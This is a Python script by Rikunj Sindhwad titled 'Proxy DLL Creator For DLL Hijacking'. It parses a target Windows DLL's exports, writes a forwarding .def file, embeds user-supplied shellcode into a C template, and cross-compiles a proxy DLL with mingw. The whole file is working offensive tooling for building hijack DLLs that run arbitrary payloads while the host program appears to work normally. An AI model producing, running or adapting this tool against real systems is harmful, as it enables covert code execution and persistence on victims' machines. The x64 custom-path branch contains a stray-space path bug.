#!/usr/bin/python3

import sys
import pefile
import os
from time import sleep
from termcolor import colored
from colorama import init
import argparse
import shutil
import tempfile
import subprocess

def create_def(dllname, arch, path):
    if path == 0:
        if arch == "x86":
            newdllname = "c://windows//syswow64//" + dllname.replace(".dll", "")
        else:
            newdllname = "c://windows//system32//" + dllname.replace(".dll", "")
    else:
        if arch == "x86":
            newdllname = path.replace("/", "//") + dllname.replace(".dll", "")
        else:
            newdllname = path.replace("/", "// ") + dllname.replace(".dll", "")

    pe = pefile.PE(dllname)

    if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        print("No Export table! Is this a DLL??")
        sys.exit(-1)

    with open("export.def", "w") as f:
        f.write("LIBRARY \"" + dllname.replace(".dll", "") + "\"\n")
        f.write("EXPORTS\n\n")

    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        with open('export.def', 'a') as f:
            if exp.name:
                f.write(f"{exp.name.decode('utf-8')}='{newdllname}'.{exp.name.decode('utf-8')} @{exp.ordinal}\n")
            else:
                f.write(f"ord{exp.ordinal}='{newdllname}'.ord{exp.ordinal} @{exp.ordinal} NONAME\n")

    print("[*] Definition File Created with name of export.def\n")
    sleep(1)

def check_arch(dllname):
    global arch
    pe = pefile.PE(dllname)
    if hex(pe.FILE_HEADER.Machine) == '0x14c':
        arch = "x86"
        print("[*] DLL is 32bit\n")
    else:
        arch = "x64"
        print("[*] DLL is 64bit\n")
    sleep(1)

def check_gcc():
    try:
        subprocess.run(["gcc", "--version"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[*] GCC is installed and available.")
    except subprocess.CalledProcessError:
        print("[!] GCC is not installed or not available in the PATH. Please install GCC and try again.")
        sys.exit(-1)

def compile_dll(dllname, arch, shellcode_file):
    # Read the shellcode from the provided binary file
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()

    # Create a temporary file for the template
    temp_dir = tempfile.mkdtemp()
    temp_template = os.path.join(temp_dir, "template.c")

    # Copy the appropriate template to the temporary location
    if arch == "x86":
        shutil.copy("template_32.c", temp_template)
    else:
        shutil.copy("template_64.c", temp_template)

    # Replace the placeholders in the template file with the actual shellcode and shellcode size
    with open(temp_template, "r") as f:
        content = f.read()

    shellcode_str = ''.join(["\\x{:02x}".format(byte) for byte in shellcode])
    content = content.replace("YOUR SHELLCODE", shellcode_str)
    content = content.replace("SHELLCODELEN", str(len(shellcode)))

    # Write the modified content back to the temp file
    with open(temp_template, "w") as f:
        f.write(content)

    # Compile the DLL using the modified template
    try:
        if arch == "x86":
            subprocess.run(["/usr/bin/i686-w64-mingw32-gcc", temp_template, "-shared", "-o", dllname.replace('.dll', '_proxy.dll'), "export.def"], check=True)
            print(f"[*] Created 32bit DLL: {dllname.replace('.dll', '_proxy.dll')}")
        else:
            subprocess.run(["/usr/bin/x86_64-w64-mingw32-gcc", temp_template, "-shared", "-o", dllname.replace('.dll', '_proxy.dll'), "export.def"], check=True)
            print(f"[*] Created 64bit DLL: {dllname.replace('.dll', '_proxy.dll')}")
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to compile DLL: {e}")
        sys.exit(-1)

    # Clean up the temporary directory
    shutil.rmtree(temp_dir)

def banner():
    init()
    print(colored('\nProxy DLL Creator For DLL Hijacking\n\t\t By \n\t   Rikunj Sindhwad \n\t     [Mr.R0b07]\n', 'green'))

def main():
    parser = argparse.ArgumentParser(description='Proxy DLL Creator for DLL Hijacking')
    parser.add_argument('dll', help='DLL file location')
    parser.add_argument('shellcode_file', help='Path to the shellcode binary file')
    parser.add_argument('real_path', nargs='?', default=0, help='Location for real path where real DLL is (optional)')
    args = parser.parse_args()

    check_gcc()
    check_arch(args.dll)
    create_def(args.dll, arch, args.real_path)
    compile_dll(args.dll, arch, args.shellcode_file)

if __name__ == "__main__":
    banner()
    sleep(1)
    main()
